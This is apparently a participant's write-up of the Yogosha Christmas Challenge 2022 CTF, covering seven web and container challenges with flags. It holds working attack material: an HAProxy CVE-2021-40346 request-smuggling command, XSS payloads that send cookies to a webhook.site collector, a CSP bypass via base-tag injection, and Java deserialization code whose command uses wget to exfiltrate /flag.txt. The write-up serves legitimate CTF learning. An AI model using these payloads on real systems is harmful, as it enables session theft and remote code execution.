---
layout: post
title: Xmas
category: Yogosha Christmas Challenge 2022
---

## Acknowledgements

I would like to thank the Yogosha team for organizing this CTF and for providing a challenging and enjoyable experience. I am honored to have placed 1st in the competition.

# 1st challenge: Welcome To Kara Org

The goal of this challenge is to read the flag secret file by pulling the image "shisuiyogo/christmas" and recovering the file as it was removed before the container is ready.

## Steps

1. Run the command `docker save image_name > chall.tar` to save the image as a tar file.
2. Create a new directory called `layers` using the command `mkdir layers`.
3. Extract the contents of the tar file into the new directory using the command `tar -C layers -xvf chall.tar`.
4. Change into the new directory using the command `cd layers`.
5. Run the command `ls -al sha256-hash-folder` to list the contents of the directory.
6. Change into the directory `sha256-hash-folder` using the command `cd sha256-hash-folder`.
7. Extract the contents of the file `layer.tar` using the command `tar -xvf layer.tar`.
8. Read the flag file using the command `cat data/secret_note.txt`.

## Flag

FLAG{Welcome_T0-The_XmAs_Chall}

# 2nd challenge: Secret Hideout

This challenge is about haproxy `CVE-2021-40346 : Integer Overflow Enables HTTP Smuggling`. The goal is to use the provided bash command to get the `/secret` route.

## Steps

1. Run the following command:

```
(printf "POST / HTTP/1.1\r\nHost: 3.82.106.93:80\r\nContent-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\nContent-Length: 28\r\n\r\n"; sleep 1;printf "GET /secret HTTP/1.1\r\nDUMMY:"; printf "GET /test HTTP/1.1\r\nHost: 3.82.106.93:80\r\n\r\n") | nc 3.82.106.93 80
```

## Flag

FLAG{ACL_Bypass_WiTh_SmuGGlinG_For_B0rUt0}

# 3rd challenge: ForbiddEn JutSu

The goal of this challenge is to use `/proc/self/fd/` to get RCE and read the flag file.

## Steps

Once you have RCE , Get the flag file name and read the flag 

This will allow you to read the flag file using this full URL: `http://44.200.237.73/?karma=/seCretJutsuToKillBorUtoKun.txt`

## Flag

FLAG{LfI_ForBiDDen_JuTsu_T0_BeAt_RaS3enGan}

# 4th challenge: Kara Jutsus Access

The goal of this challenge is to use an image polyglot as a script source to bypass csp.

## Steps

1. Use the following image: http://portswigger-labs.net/polyglot/jpeg/xss_within_header_compressed_small_logo.jpg

2. Use the following payload inside the comment field: `*/=xmlhttp=new XMLHttpRequest();xmlhttp.open("GET","/",false);xmlhttp.send();r=xmlhttp.responseText;location.href='https://webhook.site/xxxxxx/?q='+btoa(document.cookie);/*"`

3. Use a hex editing tool (such as Hex Friend on macOS) to modify the image and insert the payload.
4. Upload the modified image.
5. Create a new comment and send it to the admin.
6. Used link to report it to admin to leak cookies : 

```
http://54.82.54.16/index.php?name=test&email=aa&subject=test&message=%3Cscript%20charset=%22ISO-8859-1%22%20src=%22/upload/image_name.jpg%22%3E%3C/script%3E&subcom=test
```

## Flag

FLAG{K4ra_OnCe_Alw4y5_Kara????}

# 5th challenge: Kara Jutsus Platform

The goal of this challenge is to use a firefox issue related to version "104" to bypass the base CSP when it is enforced using a meta tag.

REF : https://www.mozilla.org/en-US/security/advisories/mfsa2022-40/#CVE-2022-40956

## Steps

1. Use the following payload in the URL: `http://54.205.207.242/index.php?src='><base href=//server/>`

2. The flag will be in the user agent once the server requests your server.

## Flag

FLAG{You_StoLe_AmaDO_ForbiDDen_CybOrg_Jutsu}

# 6th challenge: Missions Forum

The goal of this challenge is to use a Java deserialization vulnerability to access the flag file.

## Steps

1. Use the dirsearch tool to find two backup files in the `/backup` directory.
2. Based on these files, it is likely that there is a Java deserialization vulnerability.
3. Create all of the necessary folders in the same order as the package name and use the provided `Main.java` file to generate a base64 payload

```
➜   mkdir com
➜   mkdir com/yogosha
➜   mkdir com/yogosha/entities
➜   mkdir com/yogosha/utils
➜   touch com/yogosha/entities/Entity.java
➜   touch com/yogosha/utils/Utils.java
➜   mkdir com/yogosha/controllers
➜   mv MissionDebug.java com/yogosha/utils/
➜   javac com/yogosha/utils/MissionDebug.java
➜   mv Main.java com/yogosha/utils/
➜   javac com/yogosha/utils/Main.java
➜   java com/yogosha/utils/Main
```

And `Main.java` :

```
 package com.yogosha.utils;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.ObjectOutputStream;
 import java.util.Base64;
 import java.io.IOException;
 import java.lang.reflect.Field;

public class Main {
  public static void main(String[] args) {

    try {
        MissionDebug mission = new MissionDebug();
        Field debugField = mission.getClass().getDeclaredField("debug");
        debugField.setAccessible(true);
        debugField.set(mission, new String("sh -c $@|sh . echo wget https://webhook.site/xxxxxx?a=$(cat /flag.txt|base64|tr -d \"\n\")"));
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(mission);
        byte[] missionBytes = baos.toByteArray();
        String base64Mission = Base64.getEncoder().encodeToString(missionBytes);
        System.out.println(base64Mission);

    } catch (NoSuchFieldException e) {
    } catch (IllegalAccessException e) {
    } catch(IOException e) {
    }

  }
}
```

4. Use the base64 payload in a cookie in the following request:

```
GET /latest_mission HTTP/1.1
Host: 18.207.239.107
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Connection: close
Cookie: latest_mission=YOUR-B64-PAYLOAD-HERE
Cache-Control: max-age=0

```
## Flag

FLAG{J4vA_Des3rialization_1s_Th3_B3sT_U_kNoW?}


# 7th challenge: Last Battle

The goal of this challenge is to leak the flag from the admin by triggering a 500 error. This can be done using prototype pollution in the "/view" route caused by "arg.js", and then using the admin cookie and xs-leak script.

## Steps

1. Use the following URL to leak the admin cookie (note that the xss payload needs to be double-encoded):

```
http://34.204.107.224/view?id=aa%26constructor%5Bprototype%5D%5Bsrcdoc%5D%3D%253Cscript%253Efetch%28%2522https%3A%2F%2Fwebhook.site%2Fxxxxxxxx%253Fa%253D%2522%252Bdocument.cookie%29%253C%2Fscript%253E
```

2. Use the xs-leak script, which is based on the **hop by hop headers technique**. This will cause the code to fail if the user agent header is not found.
3. Check the "status_code" to determine if the search string is correct. If the status code is 500, the search string is correct. If not, continue searching until the full flag is found.

## Flag

FLAG{h0p_bY_h0p_T0_k1lL_h0pEs}

